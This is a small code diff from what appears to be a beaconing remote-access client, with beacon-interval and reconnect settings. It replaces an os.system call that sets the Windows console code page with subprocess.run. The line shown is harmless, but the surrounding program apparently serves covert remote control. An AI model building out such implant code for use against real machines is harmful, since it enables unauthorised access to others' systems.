@@ -40,7 +40,7 @@ BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
 CURRENT_WORKING_DIR = getcwd()
 RECONNECT_ATTEMPTS = 5 #immediately upon disconnect
 
-system('chcp 65001')
+subprocess.run('chcp 65001',shell=True)
 
 try:
     if name  == "nt":
